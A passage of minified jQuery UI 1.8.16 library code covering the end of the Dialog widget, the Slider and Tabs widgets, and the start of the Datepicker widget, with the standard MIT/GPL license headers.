n)d[g]=f});e&&this._size();this.uiDialog.is(":data(resizable)")&&this.uiDialog.resizable("option",d)},_setOption:function(a,b){var d=this,e=d.uiDialog;switch(a){case "beforeclose":a="beforeClose";break;case "buttons":d._createButtons(b);break;case "closeText":d.uiDialogTitlebarCloseText.text(""+b);break;case "dialogClass":e.removeClass(d.options.dialogClass).addClass("ui-dialog ui-widget ui-widget-content ui-corner-all "+b);break;case "disabled":b?e.addClass("ui-dialog-disabled"):e.removeClass("ui-dialog-disabled");break;case "draggable":var g=e.is(":data(draggable)");g&&!b&&e.draggable("destroy");!g&&b&&d._makeDraggable();break;case "position":d._position(b);break;case "resizable":(g=e.is(":data(resizable)"))&&!b&&e.resizable("destroy");g&&typeof b==="string"&&e.resizable("option","handles",b);!g&&b!==false&&d._makeResizable(b);break;case "title":c(".ui-dialog-title",d.uiDialogTitlebar).html(""+(b||"&#160;"));break}c.Widget.prototype._setOption.apply(d,arguments)},_size:function(){var a=this.options,b,d,e=this.uiDialog.is(":visible");this.element.show().css({width:"auto",minHeight:0,height:0});if(a.minWidth>a.width)a.width=a.minWidth;b=this.uiDialog.css({height:"auto",width:a.width}).height();d=Math.max(0,a.minHeight-b);if(a.height==="auto")if(c.support.minHeight)this.element.css({minHeight:d,height:"auto"});else{this.uiDialog.show();a=this.element.css("height","auto").height();e||this.uiDialog.hide();this.element.height(Math.max(a,d))}else this.element.height(Math.max(a.height-b,0));this.uiDialog.is(":data(resizable)")&&this.uiDialog.resizable("option","minHeight",this._minHeight())}});c.extend(c.ui.dialog,{version:"1.8.16",uuid:0,maxZ:0,getTitleId:function(a){a=a.attr("id");if(!a){this.uuid+=1;a=this.uuid}return"ui-dialog-title-"+a},overlay:function(a){this.$el=c.ui.dialog.overlay.create(a)}});c.extend(c.ui.dialog.overlay,{instances:[],oldInstances:[],maxZ:0,events:c.map("focus,mousedown,mouseup,keydown,keypress,click".split(","),function(a){return a+".dialog-overlay"}).join(" "),create:function(a){if(this.instances.length===0){setTimeout(function(){c.ui.dialog.overlay.instances.length&&c(document).bind(c.ui.dialog.overlay.events,function(d){if(c(d.target).zIndex()<c.ui.dialog.overlay.maxZ)return false})},1);c(document).bind("keydown.dialog-overlay",function(d){if(a.options.closeOnEscape&&!d.isDefaultPrevented()&&d.keyCode&&d.keyCode===c.ui.keyCode.ESCAPE){a.close(d);d.preventDefault()}});c(window).bind("resize.dialog-overlay",c.ui.dialog.overlay.resize)}var b=(this.oldInstances.pop()||c("<div></div>").addClass("ui-widget-overlay")).appendTo(document.body).css({width:this.width(),height:this.height()});c.fn.bgiframe&&b.bgiframe();this.instances.push(b);return b},destroy:function(a){var b=c.inArray(a,this.instances);b!=-1&&this.oldInstances.push(this.instances.splice(b,1)[0]);this.instances.length===0&&c([document,window]).unbind(".dialog-overlay");a.remove();var d=0;c.each(this.instances,function(){d=Math.max(d,this.css("z-index"))});this.maxZ=d},height:function(){var a,b;if(c.browser.msie&&c.browser.version<7){a=Math.max(document.documentElement.scrollHeight,document.body.scrollHeight);b=Math.max(document.documentElement.offsetHeight,document.body.offsetHeight);return a<b?c(window).height()+"px":a+"px"}else return c(document).height()+"px"},width:function(){var a,b;if(c.browser.msie){a=Math.max(document.documentElement.scrollWidth,document.body.scrollWidth);b=Math.max(document.documentElement.offsetWidth,document.body.offsetWidth);return a<b?c(window).width()+"px":a+"px"}else return c(document).width()+"px"},resize:function(){var a=c([]);c.each(c.ui.dialog.overlay.instances,function(){a=a.add(this)});a.css({width:0,height:0}).css({width:c.ui.dialog.overlay.width(),height:c.ui.dialog.overlay.height()})}});c.extend(c.ui.dialog.overlay.prototype,{destroy:function(){c.ui.dialog.overlay.destroy(this.$el)}})})(jQuery);

/*
 * jQuery UI Slider 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Slider
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.mouse.js
 *jquery.ui.widget.js
 */
(function(d){d.widget("ui.slider",d.ui.mouse,{widgetEventPrefix:"slide",options:{animate:false,distance:0,max:100,min:0,orientation:"horizontal",range:false,step:1,value:0,values:null},_create:function(){var a=this,b=this.options,c=this.element.find(".ui-slider-handle").addClass("ui-state-default ui-corner-all"),f=b.values&&b.values.length||1,e=[];this._mouseSliding=this._keySliding=false;this._animateOff=true;this._handleIndex=null;this._detectOrientation();this._mouseInit();this.element.addClass("ui-slider ui-slider-"+this.orientation+" ui-widget ui-widget-content ui-corner-all"+(b.disabled?" ui-slider-disabled ui-disabled":""));this.range=d([]);if(b.range){if(b.range===true){if(!b.values)b.values=[this._valueMin(),this._valueMin()];if(b.values.length&&b.values.length!==2)b.values=[b.values[0],b.values[0]]}this.range=d("<div></div>").appendTo(this.element).addClass("ui-slider-range ui-widget-header"+(b.range==="min"||b.range==="max"?" ui-slider-range-"+b.range:""))}for(var j=c.length;j<f;j+=1)e.push("<a class='ui-slider-handle ui-state-default ui-corner-all' href='#'></a>");this.handles=c.add(d(e.join("")).appendTo(a.element));this.handle=this.handles.eq(0);this.handles.add(this.range).filter("a").click(function(g){g.preventDefault()}).hover(function(){b.disabled||d(this).addClass("ui-state-hover")},function(){d(this).removeClass("ui-state-hover")}).focus(function(){if(b.disabled)d(this).blur();else{d(".ui-slider .ui-state-focus").removeClass("ui-state-focus");d(this).addClass("ui-state-focus")}}).blur(function(){d(this).removeClass("ui-state-focus")});this.handles.each(function(g){d(this).data("index.ui-slider-handle",g)});this.handles.keydown(function(g){var k=true,l=d(this).data("index.ui-slider-handle"),i,h,m;if(!a.options.disabled){switch(g.keyCode){case d.ui.keyCode.HOME:case d.ui.keyCode.END:case d.ui.keyCode.PAGE_UP:case d.ui.keyCode.PAGE_DOWN:case d.ui.keyCode.UP:case d.ui.keyCode.RIGHT:case d.ui.keyCode.DOWN:case d.ui.keyCode.LEFT:k=false;if(!a._keySliding){a._keySliding=true;d(this).addClass("ui-state-active");i=a._start(g,l);if(i===false)return}break}m=a.options.step;i=a.options.values&&a.options.values.length?(h=a.values(l)):(h=a.value());switch(g.keyCode){case d.ui.keyCode.HOME:h=a._valueMin();break;case d.ui.keyCode.END:h=a._valueMax();break;case d.ui.keyCode.PAGE_UP:h=a._trimAlignValue(i+(a._valueMax()-a._valueMin())/5);break;case d.ui.keyCode.PAGE_DOWN:h=a._trimAlignValue(i-(a._valueMax()-a._valueMin())/5);break;case d.ui.keyCode.UP:case d.ui.keyCode.RIGHT:if(i===a._valueMax())return;h=a._trimAlignValue(i+m);break;case d.ui.keyCode.DOWN:case d.ui.keyCode.LEFT:if(i===a._valueMin())return;h=a._trimAlignValue(i-m);break}a._slide(g,l,h);return k}}).keyup(function(g){var k=d(this).data("index.ui-slider-handle");if(a._keySliding){a._keySliding=false;a._stop(g,k);a._change(g,k);d(this).removeClass("ui-state-active")}});this._refreshValue();this._animateOff=false},destroy:function(){this.handles.remove();this.range.remove();this.element.removeClass("ui-slider ui-slider-horizontal ui-slider-vertical ui-slider-disabled ui-widget ui-widget-content ui-corner-all").removeData("slider").unbind(".slider");this._mouseDestroy();return this},_mouseCapture:function(a){var b=this.options,c,f,e,j,g;if(b.disabled)return false;this.elementSize={width:this.element.outerWidth(),height:this.element.outerHeight()};this.elementOffset=this.element.offset();c=this._normValueFromMouse({x:a.pageX,y:a.pageY});f=this._valueMax()-this._valueMin()+1;j=this;this.handles.each(function(k){var l=Math.abs(c-j.values(k));if(f>l){f=l;e=d(this);g=k}});if(b.range===true&&this.values(1)===b.min){g+=1;e=d(this.handles[g])}if(this._start(a,g)===false)return false;this._mouseSliding=true;j._handleIndex=g;e.addClass("ui-state-active").focus();b=e.offset();this._clickOffset=!d(a.target).parents().andSelf().is(".ui-slider-handle")?{left:0,top:0}:{left:a.pageX-b.left-e.width()/2,top:a.pageY-b.top-e.height()/2-(parseInt(e.css("borderTopWidth"),10)||0)-(parseInt(e.css("borderBottomWidth"),10)||0)+(parseInt(e.css("marginTop"),10)||0)};this.handles.hasClass("ui-state-hover")||this._slide(a,g,c);return this._animateOff=true},_mouseStart:function(){return true},_mouseDrag:function(a){var b=this._normValueFromMouse({x:a.pageX,y:a.pageY});this._slide(a,this._handleIndex,b);return false},_mouseStop:function(a){this.handles.removeClass("ui-state-active");this._mouseSliding=false;this._stop(a,this._handleIndex);this._change(a,this._handleIndex);this._clickOffset=this._handleIndex=null;return this._animateOff=false},_detectOrientation:function(){this.orientation=this.options.orientation==="vertical"?"vertical":"horizontal"},_normValueFromMouse:function(a){var b;if(this.orientation==="horizontal"){b=this.elementSize.width;a=a.x-this.elementOffset.left-(this._clickOffset?this._clickOffset.left:0)}else{b=this.elementSize.height;a=a.y-this.elementOffset.top-(this._clickOffset?this._clickOffset.top:0)}b=a/b;if(b>1)b=1;if(b<0)b=0;if(this.orientation==="vertical")b=1-b;a=this._valueMax()-this._valueMin();return this._trimAlignValue(this._valueMin()+b*a)},_start:function(a,b){var c={handle:this.handles[b],value:this.value()};if(this.options.values&&this.options.values.length){c.value=this.values(b);c.values=this.values()}return this._trigger("start",a,c)},_slide:function(a,b,c){var f;if(this.options.values&&this.options.values.length){f=this.values(b?0:1);if(this.options.values.length===2&&this.options.range===true&&(b===0&&c>f||b===1&&c<f))c=f;if(c!==this.values(b)){f=this.values();f[b]=c;a=this._trigger("slide",a,{handle:this.handles[b],value:c,values:f});this.values(b?0:1);a!==false&&this.values(b,c,true)}}else if(c!==this.value()){a=this._trigger("slide",a,{handle:this.handles[b],value:c});a!==false&&this.value(c)}},_stop:function(a,b){var c={handle:this.handles[b],value:this.value()};if(this.options.values&&this.options.values.length){c.value=this.values(b);c.values=this.values()}this._trigger("stop",a,c)},_change:function(a,b){if(!this._keySliding&&!this._mouseSliding){var c={handle:this.handles[b],value:this.value()};if(this.options.values&&this.options.values.length){c.value=this.values(b);c.values=this.values()}this._trigger("change",a,c)}},value:function(a){if(arguments.length){this.options.value=this._trimAlignValue(a);this._refreshValue();this._change(null,0)}else return this._value()},values:function(a,b){var c,f,e;if(arguments.length>1){this.options.values[a]=this._trimAlignValue(b);this._refreshValue();this._change(null,a)}else if(arguments.length)if(d.isArray(arguments[0])){c=this.options.values;f=arguments[0];for(e=0;e<c.length;e+=1){c[e]=this._trimAlignValue(f[e]);this._change(null,e)}this._refreshValue()}else return this.options.values&&this.options.values.length?this._values(a):this.value();else return this._values()},_setOption:function(a,b){var c,f=0;if(d.isArray(this.options.values))f=this.options.values.length;d.Widget.prototype._setOption.apply(this,arguments);switch(a){case "disabled":if(b){this.handles.filter(".ui-state-focus").blur();this.handles.removeClass("ui-state-hover");this.handles.propAttr("disabled",true);this.element.addClass("ui-disabled")}else{this.handles.propAttr("disabled",false);this.element.removeClass("ui-disabled")}break;case "orientation":this._detectOrientation();this.element.removeClass("ui-slider-horizontal ui-slider-vertical").addClass("ui-slider-"+this.orientation);this._refreshValue();break;case "value":this._animateOff=true;this._refreshValue();this._change(null,0);this._animateOff=false;break;case "values":this._animateOff=true;this._refreshValue();for(c=0;c<f;c+=1)this._change(null,c);this._animateOff=false;break}},_value:function(){var a=this.options.value;return a=this._trimAlignValue(a)},_values:function(a){var b,c;if(arguments.length){b=this.options.values[a];return b=this._trimAlignValue(b)}else{b=this.options.values.slice();for(c=0;c<b.length;c+=1)b[c]=this._trimAlignValue(b[c]);return b}},_trimAlignValue:function(a){if(a<=this._valueMin())return this._valueMin();if(a>=this._valueMax())return this._valueMax();var b=this.options.step>0?this.options.step:1,c=(a-this._valueMin())%b;a=a-c;if(Math.abs(c)*2>=b)a+=c>0?b:-b;return parseFloat(a.toFixed(5))},_valueMin:function(){return this.options.min},_valueMax:function(){return this.options.max},_refreshValue:function(){var a=this.options.range,b=this.options,c=this,f=!this._animateOff?b.animate:false,e,j={},g,k,l,i;if(this.options.values&&this.options.values.length)this.handles.each(function(h){e=(c.values(h)-c._valueMin())/(c._valueMax()-c._valueMin())*100;j[c.orientation==="horizontal"?"left":"bottom"]=e+"%";d(this).stop(1,1)[f?"animate":"css"](j,b.animate);if(c.options.range===true)if(c.orientation==="horizontal"){if(h===0)c.range.stop(1,1)[f?"animate":"css"]({left:e+"%"},b.animate);if(h===1)c.range[f?"animate":"css"]({width:e-g+"%"},{queue:false,duration:b.animate})}else{if(h===0)c.range.stop(1,1)[f?"animate":"css"]({bottom:e+"%"},b.animate);if(h===1)c.range[f?"animate":"css"]({height:e-g+"%"},{queue:false,duration:b.animate})}g=e});else{k=this.value();l=this._valueMin();i=this._valueMax();e=i!==l?(k-l)/(i-l)*100:0;j[c.orientation==="horizontal"?"left":"bottom"]=e+"%";this.handle.stop(1,1)[f?"animate":"css"](j,b.animate);if(a==="min"&&this.orientation==="horizontal")this.range.stop(1,1)[f?"animate":"css"]({width:e+"%"},b.animate);if(a==="max"&&this.orientation==="horizontal")this.range[f?"animate":"css"]({width:100-e+"%"},{queue:false,duration:b.animate});if(a==="min"&&this.orientation==="vertical")this.range.stop(1,1)[f?"animate":"css"]({height:e+"%"},b.animate);if(a==="max"&&this.orientation==="vertical")this.range[f?"animate":"css"]({height:100-e+"%"},{queue:false,duration:b.animate})}}});d.extend(d.ui.slider,{version:"1.8.16"})})(jQuery);

/*
 * jQuery UI Tabs 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Tabs
 *
 * Depends:
 *jquery.ui.core.js
 *jquery.ui.widget.js
 */
(function(d,p){function u(){return++v}function w(){return++x}var v=0,x=0;d.widget("ui.tabs",{options:{add:null,ajaxOptions:null,cache:false,cookie:null,collapsible:false,disable:null,disabled:[],enable:null,event:"click",fx:null,idPrefix:"ui-tabs-",load:null,panelTemplate:"<div></div>",remove:null,select:null,show:null,spinner:"<em>Loading&#8230;</em>",tabTemplate:"<li><a href='#{href}'><span>#{label}</span></a></li>"},_create:function(){this._tabify(true)},_setOption:function(b,e){if(b=="selected")this.options.collapsible&&e==this.options.selected||this.select(e);else{this.options[b]=e;this._tabify()}},_tabId:function(b){return b.title&&b.title.replace(/\s/g,"_").replace(/[^\w\u00c0-\uFFFF-]/g,"")||this.options.idPrefix+u()},_sanitizeSelector:function(b){return b.replace(/:/g,"\\:")},_cookie:function(){var b=this.cookie||(this.cookie=this.options.cookie.name||"ui-tabs-"+w());return d.cookie.apply(null,[b].concat(d.makeArray(arguments)))},_ui:function(b,e){return{tab:b,panel:e,index:this.anchors.index(b)}},_cleanup:function(){this.lis.filter(".ui-state-processing").removeClass("ui-state-processing").find("span:data(label.tabs)").each(function(){var b=d(this);b.html(b.data("label.tabs")).removeData("label.tabs")})},_tabify:function(b){function e(g,f){g.css("display","");!d.support.opacity&&f.opacity&&g[0].style.removeAttribute("filter")}var a=this,c=this.options,h=/^#.+/;this.list=this.element.find("ol,ul").eq(0);this.lis=d(" > li:has(a[href])",this.list);this.anchors=this.lis.map(function(){return d("a",this)[0]});this.panels=d([]);this.anchors.each(function(g,f){var i=d(f).attr("href"),l=i.split("#")[0],q;if(l&&(l===location.toString().split("#")[0]||(q=d("base")[0])&&l===q.href)){i=f.hash;f.href=i}if(h.test(i))a.panels=a.panels.add(a.element.find(a._sanitizeSelector(i)));else if(i&&i!=="#"){d.data(f,"href.tabs",i);d.data(f,"load.tabs",i.replace(/#.*$/,""));i=a._tabId(f);f.href="#"+i;f=a.element.find("#"+i);if(!f.length){f=d(c.panelTemplate).attr("id",i).addClass("ui-tabs-panel ui-widget-content ui-corner-bottom").insertAfter(a.panels[g-1]||a.list);f.data("destroy.tabs",true)}a.panels=a.panels.add(f)}else c.disabled.push(g)});if(b){this.element.addClass("ui-tabs ui-widget ui-widget-content ui-corner-all");this.list.addClass("ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all");this.lis.addClass("ui-state-default ui-corner-top");this.panels.addClass("ui-tabs-panel ui-widget-content ui-corner-bottom");if(c.selected===p){location.hash&&this.anchors.each(function(g,f){if(f.hash==location.hash){c.selected=g;return false}});if(typeof c.selected!=="number"&&c.cookie)c.selected=parseInt(a._cookie(),10);if(typeof c.selected!=="number"&&this.lis.filter(".ui-tabs-selected").length)c.selected=this.lis.index(this.lis.filter(".ui-tabs-selected"));c.selected=c.selected||(this.lis.length?0:-1)}else if(c.selected===null)c.selected=-1;c.selected=c.selected>=0&&this.anchors[c.selected]||c.selected<0?c.selected:0;c.disabled=d.unique(c.disabled.concat(d.map(this.lis.filter(".ui-state-disabled"),function(g){return a.lis.index(g)}))).sort();d.inArray(c.selected,c.disabled)!=-1&&c.disabled.splice(d.inArray(c.selected,c.disabled),1);this.panels.addClass("ui-tabs-hide");this.lis.removeClass("ui-tabs-selected ui-state-active");if(c.selected>=0&&this.anchors.length){a.element.find(a._sanitizeSelector(a.anchors[c.selected].hash)).removeClass("ui-tabs-hide");this.lis.eq(c.selected).addClass("ui-tabs-selected ui-state-active");a.element.queue("tabs",function(){a._trigger("show",null,a._ui(a.anchors[c.selected],a.element.find(a._sanitizeSelector(a.anchors[c.selected].hash))[0]))});this.load(c.selected)}d(window).bind("unload",function(){a.lis.add(a.anchors).unbind(".tabs");a.lis=a.anchors=a.panels=null})}else c.selected=this.lis.index(this.lis.filter(".ui-tabs-selected"));this.element[c.collapsible?"addClass":"removeClass"]("ui-tabs-collapsible");c.cookie&&this._cookie(c.selected,c.cookie);b=0;for(var j;j=this.lis[b];b++)d(j)[d.inArray(b,c.disabled)!=-1&&!d(j).hasClass("ui-tabs-selected")?"addClass":"removeClass"]("ui-state-disabled");c.cache===false&&this.anchors.removeData("cache.tabs");this.lis.add(this.anchors).unbind(".tabs");if(c.event!=="mouseover"){var k=function(g,f){f.is(":not(.ui-state-disabled)")&&f.addClass("ui-state-"+g)},n=function(g,f){f.removeClass("ui-state-"+g)};this.lis.bind("mouseover.tabs",function(){k("hover",d(this))});this.lis.bind("mouseout.tabs",function(){n("hover",d(this))});this.anchors.bind("focus.tabs",function(){k("focus",d(this).closest("li"))});this.anchors.bind("blur.tabs",function(){n("focus",d(this).closest("li"))})}var m,o;if(c.fx)if(d.isArray(c.fx)){m=c.fx[0];o=c.fx[1]}else m=o=c.fx;var r=o?function(g,f){d(g).closest("li").addClass("ui-tabs-selected ui-state-active");f.hide().removeClass("ui-tabs-hide").animate(o,o.duration||"normal",function(){e(f,o);a._trigger("show",null,a._ui(g,f[0]))})}:function(g,f){d(g).closest("li").addClass("ui-tabs-selected ui-state-active");f.removeClass("ui-tabs-hide");a._trigger("show",null,a._ui(g,f[0]))},s=m?function(g,f){f.animate(m,m.duration||"normal",function(){a.lis.removeClass("ui-tabs-selected ui-state-active");f.addClass("ui-tabs-hide");e(f,m);a.element.dequeue("tabs")})}:function(g,f){a.lis.removeClass("ui-tabs-selected ui-state-active");f.addClass("ui-tabs-hide");a.element.dequeue("tabs")};this.anchors.bind(c.event+".tabs",function(){var g=this,f=d(g).closest("li"),i=a.panels.filter(":not(.ui-tabs-hide)"),l=a.element.find(a._sanitizeSelector(g.hash));if(f.hasClass("ui-tabs-selected")&&!c.collapsible||f.hasClass("ui-state-disabled")||f.hasClass("ui-state-processing")||a.panels.filter(":animated").length||a._trigger("select",null,a._ui(this,l[0]))===false){this.blur();return false}c.selected=a.anchors.index(this);a.abort();if(c.collapsible)if(f.hasClass("ui-tabs-selected")){c.selected=-1;c.cookie&&a._cookie(c.selected,c.cookie);a.element.queue("tabs",function(){s(g,i)}).dequeue("tabs");this.blur();return false}else if(!i.length){c.cookie&&a._cookie(c.selected,c.cookie);a.element.queue("tabs",function(){r(g,l)});a.load(a.anchors.index(this));this.blur();return false}c.cookie&&a._cookie(c.selected,c.cookie);if(l.length){i.length&&a.element.queue("tabs",function(){s(g,i)});a.element.queue("tabs",function(){r(g,l)});a.load(a.anchors.index(this))}else throw"jQuery UI Tabs: Mismatching fragment identifier.";d.browser.msie&&this.blur()});this.anchors.bind("click.tabs",function(){return false})},_getIndex:function(b){if(typeof b=="string")b=this.anchors.index(this.anchors.filter("[href$="+b+"]"));return b},destroy:function(){var b=this.options;this.abort();this.element.unbind(".tabs").removeClass("ui-tabs ui-widget ui-widget-content ui-corner-all ui-tabs-collapsible").removeData("tabs");this.list.removeClass("ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all");this.anchors.each(function(){var e=d.data(this,"href.tabs");if(e)this.href=e;var a=d(this).unbind(".tabs");d.each(["href","load","cache"],function(c,h){a.removeData(h+".tabs")})});this.lis.unbind(".tabs").add(this.panels).each(function(){d.data(this,"destroy.tabs")?d(this).remove():d(this).removeClass("ui-state-default ui-corner-top ui-tabs-selected ui-state-active ui-state-hover ui-state-focus ui-state-disabled ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide")});b.cookie&&this._cookie(null,b.cookie);return this},add:function(b,e,a){if(a===p)a=this.anchors.length;var c=this,h=this.options;e=d(h.tabTemplate.replace(/#\{href\}/g,b).replace(/#\{label\}/g,e));b=!b.indexOf("#")?b.replace("#",""):this._tabId(d("a",e)[0]);e.addClass("ui-state-default ui-corner-top").data("destroy.tabs",true);var j=c.element.find("#"+b);j.length||(j=d(h.panelTemplate).attr("id",b).data("destroy.tabs",true));j.addClass("ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide");if(a>=this.lis.length){e.appendTo(this.list);j.appendTo(this.list[0].parentNode)}else{e.insertBefore(this.lis[a]);j.insertBefore(this.panels[a])}h.disabled=d.map(h.disabled,function(k){return k>=a?++k:k});this._tabify();if(this.anchors.length==1){h.selected=0;e.addClass("ui-tabs-selected ui-state-active");j.removeClass("ui-tabs-hide");this.element.queue("tabs",function(){c._trigger("show",null,c._ui(c.anchors[0],c.panels[0]))});this.load(0)}this._trigger("add",null,this._ui(this.anchors[a],this.panels[a]));return this},remove:function(b){b=this._getIndex(b);var e=this.options,a=this.lis.eq(b).remove(),c=this.panels.eq(b).remove();if(a.hasClass("ui-tabs-selected")&&this.anchors.length>1)this.select(b+(b+1<this.anchors.length?1:-1));e.disabled=d.map(d.grep(e.disabled,function(h){return h!=b}),function(h){return h>=b?--h:h});this._tabify();this._trigger("remove",null,this._ui(a.find("a")[0],c[0]));return this},enable:function(b){b=this._getIndex(b);var e=this.options;if(d.inArray(b,e.disabled)!=-1){this.lis.eq(b).removeClass("ui-state-disabled");e.disabled=d.grep(e.disabled,function(a){return a!=b});this._trigger("enable",null,this._ui(this.anchors[b],this.panels[b]));return this}},disable:function(b){b=this._getIndex(b);var e=this.options;if(b!=e.selected){this.lis.eq(b).addClass("ui-state-disabled");e.disabled.push(b);e.disabled.sort();this._trigger("disable",null,this._ui(this.anchors[b],this.panels[b]))}return this},select:function(b){b=this._getIndex(b);if(b==-1)if(this.options.collapsible&&this.options.selected!=-1)b=this.options.selected;else return this;this.anchors.eq(b).trigger(this.options.event+".tabs");return this},load:function(b){b=this._getIndex(b);var e=this,a=this.options,c=this.anchors.eq(b)[0],h=d.data(c,"load.tabs");this.abort();if(!h||this.element.queue("tabs").length!==0&&d.data(c,"cache.tabs"))this.element.dequeue("tabs");else{this.lis.eq(b).addClass("ui-state-processing");if(a.spinner){var j=d("span",c);j.data("label.tabs",j.html()).html(a.spinner)}this.xhr=d.ajax(d.extend({},a.ajaxOptions,{url:h,success:function(k,n){e.element.find(e._sanitizeSelector(c.hash)).html(k);e._cleanup();a.cache&&d.data(c,"cache.tabs",true);e._trigger("load",null,e._ui(e.anchors[b],e.panels[b]));try{a.ajaxOptions.success(k,n)}catch(m){}},error:function(k,n){e._cleanup();e._trigger("load",null,e._ui(e.anchors[b],e.panels[b]));try{a.ajaxOptions.error(k,n,b,c)}catch(m){}}}));e.element.dequeue("tabs");return this}},abort:function(){this.element.queue([]);this.panels.stop(false,true);this.element.queue("tabs",this.element.queue("tabs").splice(-2,2));if(this.xhr){this.xhr.abort();delete this.xhr}this._cleanup();return this},url:function(b,e){this.anchors.eq(b).removeData("cache.tabs").data("load.tabs",e);return this},length:function(){return this.anchors.length}});d.extend(d.ui.tabs,{version:"1.8.16"});d.extend(d.ui.tabs.prototype,{rotation:null,rotate:function(b,e){var a=this,c=this.options,h=a._rotate||(a._rotate=function(j){clearTimeout(a.rotation);a.rotation=setTimeout(function(){var k=c.selected;a.select(++k<a.anchors.length?k:0)},b);j&&j.stopPropagation()});e=a._unrotate||(a._unrotate=!e?function(j){j.clientX&&a.rotate(null)}:function(){t=c.selected;h()});if(b){this.element.bind("tabsshow",h);this.anchors.bind(c.event+".tabs",e);h()}else{clearTimeout(a.rotation);this.element.unbind("tabsshow",h);this.anchors.unbind(c.event+".tabs",e);delete this._rotate;delete this._unrotate}return this}})})(jQuery);

/*
 * jQuery UI Datepicker 1.8.16
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Datepicker
 *
 * Depends:
 *jquery.ui.core.js
 */
(function(d,C){function M(){this.debug=false;this._curInst=null;this._keyEvent=false;this._disabledInputs=[];this._inDialog=this._datepickerShowing=false;this._mainDivId="ui-datepicker-div";this._inlineClass="ui-datepicker-inline";this._appendClass="ui-datepicker-append";this._triggerClass="ui-datepicker-trigger";this._dialogClass="ui-datepicker-dialog";this._disableClass="ui-datepicker-disabled";this._unselectableClass="ui-datepicker-unselectable";this._currentClass="ui-datepicker-current-day";this._dayOverClass="ui-datepicker-days-cell-over";this.regional=[];this.regional[""]={closeText:"Done",prevText:"Prev",nextText:"Next",currentText:"Today",monthNames:["January","February","March","April","May","June","July","August","September","October","November","December"],monthNamesShort:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],dayNames:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],dayNamesShort:["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],dayNamesMin:["Su","Mo","Tu","We","Th","Fr","Sa"],weekHeader:"Wk",dateFormat:"mm/dd/yy",firstDay:0,isRTL:false,showMonthAfterYear:false,yearSuffix:""};this._defaults={showOn:"focus",showAnim:"fadeIn",showOptions:{},defaultDate:null,appendText:"",buttonText:"...",buttonImage:"",buttonImageOnly:false,hideIfNoPrevNext:false,navigationAsDateFormat:false,gotoCurrent:false,changeMonth:false,changeYear:false,yearRange:"c-10:c+10",showOtherMonths:false,selectOtherMonths:false,showWeek:false,calculateWeek:this.iso8601Week,shortYearCutoff:"+10",minDate:null,maxDate:null,duration:"fast",beforeShowDay:null,beforeShow:null,onSelect:null,onChangeMonthYear:null,onClose:null,numberOfMonths:1,showCurrentAtPos:0,stepMonths:1,stepBigMonths:12,altField:"",altFormat:"",constrainInput:true,showButtonPanel:false,autoSize:false,disabled:false};d.extend(this._defaults,this.regional[""]);this.dpDiv=N(d('<div id="'+this._mainDivId+'" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all"></div>'))}function N(a){return a.bind("mouseout",function(b){b=d(b.target).closest("button, .ui-datepicker-prev, .ui-datepicker-next, .ui-datepicker-calendar td a");b.length&&b.removeClass("ui-state-hover ui-datepicker-prev-hover ui-datepicker-next-hover")}).bind("mouseover",function(b){b=d(b.target).closest("button, .ui-datepicker-prev, .ui-datepicker-next, .ui-datepicker-calendar td a");if(!(d.datepicker._isDisabledDatepicker(J.inline?a.parent()[0]:J.input[0])||!b.length)){b.parents(".ui-datepicker-calendar").find("a").removeClass("ui-state-hover");b.addClass("ui-state-hover");b.hasClass("ui-datepicker-prev")&&b.addClass("ui-datepicker-prev-hover");b.hasClass("ui-datepicker-next")&&b.addClass("ui-datepicker-next-hover")}})}function H(a,b){d.extend(a,b);for(var c in b)if(b[c]==null||b[c]==C)a[c]=b[c];return a}d.extend(d.ui,{datepicker:{version:"1.8.16"}});var B=(new Date).getTime(),J;d.extend(M.prototype,{markerClassName:"hasDatepicker",maxRows:4,log:function(){this.debug&&console.log.apply("",arguments)},_widgetDatepicker:function(){return this.dpDiv},setDefaults:function(a){H(this._defaults,a||{});return this},_attachDatepicker:function(a,b){var c=null;for(var e in this._defaults){var f=a.getAttribute("date:"+e);if(f){c=c||{};try{c[e]=eval(f)}catch(h){c[e]=f}}}e=a.nodeName.toLowerCase();f=e=="div"||e=="span";if(!a.id){this.uuid+=1;a.id="dp"+this.uuid}var i=this._newInst(d(a),f);i.settings=d.extend({},b||{},c||{});if(e=="input")this._connectDatepicker(a,i);else f&&this._inlineDatepicker(a,i)},_newInst:function(a,b){return{id:a[0].id.replace(/([^A-Za-z0-9_-])/g,"\\\\$1"),input:a,selectedDay:0,selectedMonth:0,selectedYear:0,drawMonth:0,drawYear:0,inline:b,dpDiv:!b?this.dpDiv:N(d('<div class="'+this._inlineClass+' ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all"></div>'))}},_connectDatepicker:function(a,b){var c=d(a);b.append=d([]);b.trigger=d([]);if(!c.hasClass(this.markerClassName)){this._attachments(c,b);c.addClass(this.markerClassName).keydown(this._doKeyDown).keypress(this._doKeyPress).keyup(this._doKeyUp).bind("setData.datepicker",function(e,f,h){b.settings[f]=h}).bind("getData.datepicker",function(e,f){return this._get(b,f)});this._autoSize(b);d.data(a,"datepicker",b);b.settings.disabled&&this._disableDatepicker(a)}},_attachments:function(a,b){var c=this._get(b,"appendText"),e=this._get(b,"isRTL");b.append&&b.append.remove();if(c){b.append=d('<span 